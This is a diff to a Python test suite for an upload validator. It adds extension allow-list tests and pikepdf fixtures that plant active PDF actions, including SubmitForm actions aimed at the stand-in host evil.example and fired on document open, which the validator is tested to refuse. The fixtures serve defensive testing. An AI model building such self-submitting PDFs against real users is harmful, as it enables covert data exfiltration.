@@ -16,8 +16,8 @@ from app.upload_safety import (
     SafeFile,
     read_capped,
     sanitise_filename,
-    validate,
 )
+from app.upload_safety import validate as _validate
 
 LIMITS = Limits(max_bytes=1024 * 1024, max_pdf_pages=3)
 
@@ -37,6 +37,15 @@ def _pdf(pages: int = 1, build=None, **save) -> bytes:
     buf = io.BytesIO()
     pdf.save(buf, **save)
     return buf.getvalue()
+
+
+def validate(data: bytes, limits: Limits, *, filename: str | None = "") -> SafeFile | Rejection:
+    """`upload_safety.validate`, with a name matching the content when none is given."""
+    if filename == "":
+        filename = "scan.png" if data[:1] == bytes([0x89]) else (
+            "scan.jpg" if data[:1] == bytes([0xFF]) else "scan.pdf"
+        )
+    return _validate(data, limits, filename=filename)
 
 
 def _rejected(result, code: str, status: int) -> None:
@@ -88,14 +97,41 @@ def test_anything_but_pdf_jpeg_or_png_is_unsupported(data):
 def test_a_disguised_file_is_a_type_mismatch():
     _rejected(validate(_image("PNG"), LIMITS, filename="passport.pdf"), "type_mismatch", 415)
     _rejected(validate(_pdf(), LIMITS, filename="scan.jpg"), "type_mismatch", 415)
-    _rejected(validate(_image("JPEG"), LIMITS, filename="photo.exe"), "type_mismatch", 415)
+    _rejected(validate(_image("JPEG"), LIMITS, filename="photo.png"), "type_mismatch", 415)
+    _rejected(validate(_image("PNG"), LIMITS, filename="photo.jpeg"), "type_mismatch", 415)
 
 
 def test_the_name_never_decides_the_type():
-    for name in (None, "scan", "SCAN.JPEG", "scan.jpg"):
+    for name in ("SCAN.JPEG", "scan.jpg", "scan.Jpeg"):
         result = validate(_image("JPEG"), LIMITS, filename=name)
         assert isinstance(result, SafeFile)
         assert (result.content_type, result.extension) == ("image/jpeg", "jpg")
+
+
+@pytest.mark.parametrize(
+    "name", ["passport.PDF", "Scan.Pdf", "a.b.pdf"]
+)
+def test_the_extension_is_checked_case_insensitively(name):
+    assert isinstance(validate(_pdf(), LIMITS, filename=name), SafeFile)
+
+
+@pytest.mark.parametrize(
+    "fmt, name",
+    [
+        ("JPEG", None),
+        ("JPEG", "scan"),
+        ("JPEG", "scan.jpe"),
+        ("JPEG", "scan.JPE"),
+        ("JPEG", ".jpg"),
+        ("JPEG", "scan.jpg."),
+        ("PNG", "scan.gif"),
+        ("PDF", "cert.txt"),
+        ("PDF", "cert.exe"),
+    ],
+)
+def test_a_name_off_the_allow_list_is_unsupported(fmt, name):
+    data = _pdf() if fmt == "PDF" else _image(fmt)
+    _rejected(validate(data, LIMITS, filename=name), "unsupported_type", 415)
 
 
 # --- Images ------------------------------------------------------------------------------
@@ -227,13 +263,44 @@ def _page_aa_javascript(pdf):
     )
 
 
+def _link(action):
+    def build(pdf):
+        pdf.pages[0].Annots = pdf.make_indirect(pikepdf.Array([
+            pikepdf.Dictionary(
+                Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link, Rect=[0, 0, 10, 10], A=action,
+            )
+        ]))
+    build.__name__ = f"_link_{str(action.S)[1:]}"
+    return build
+
+
+_submit_form = _link(pikepdf.Dictionary(S=pikepdf.Name.SubmitForm, F=pikepdf.String("https://evil.example/")))
+_import_data = _link(pikepdf.Dictionary(S=pikepdf.Name.ImportData, F=pikepdf.String("data.fdf")))
+_goto_r = _link(pikepdf.Dictionary(S=pikepdf.Name.GoToR, F=pikepdf.String("other.pdf"), D=pikepdf.Array([0, pikepdf.Name.Fit])))
+_goto_e = _link(pikepdf.Dictionary(S=pikepdf.Name.GoToE, D=pikepdf.Array([0, pikepdf.Name.Fit])))
+
+
+def _form_submit_on_open(pdf):
+    pdf.Root.OpenAction = pikepdf.Dictionary(S=pikepdf.Name.SubmitForm, F=pikepdf.String("https://evil.example/"))
+
+
 @pytest.mark.parametrize(
     "build",
-    [_open_action_js, _names_javascript, _page_annotation_launch, _embedded_file, _rich_media, _xfa,
-     _page_aa_javascript],
+    ids=lambda build: getattr(build, "__name__", "?"),
+    argvalues=[_open_action_js, _names_javascript, _page_annotation_launch, _embedded_file, _rich_media, _xfa,
+     _page_aa_javascript, _submit_form, _import_data, _goto_r, _goto_e, _form_submit_on_open],
 )
 def test_active_pdf_content_is_refused(build):
     _rejected(validate(_pdf(build=build), LIMITS), "pdf_active_content", 422)
+
+
+def test_an_ordinary_web_link_is_kept():
+    data = _pdf(build=_link(pikepdf.Dictionary(S=pikepdf.Name.URI, URI=pikepdf.String("https://imo.org/"))))
+    result = validate(data, LIMITS)
+    assert isinstance(result, SafeFile)
+    with pikepdf.open(io.BytesIO(result.content)) as cleaned:
+        [annot] = cleaned.pages[0].Annots
+        assert annot.A.S == pikepdf.Name.URI
 
 
 def test_javascript_hidden_in_an_object_stream_is_still_found():
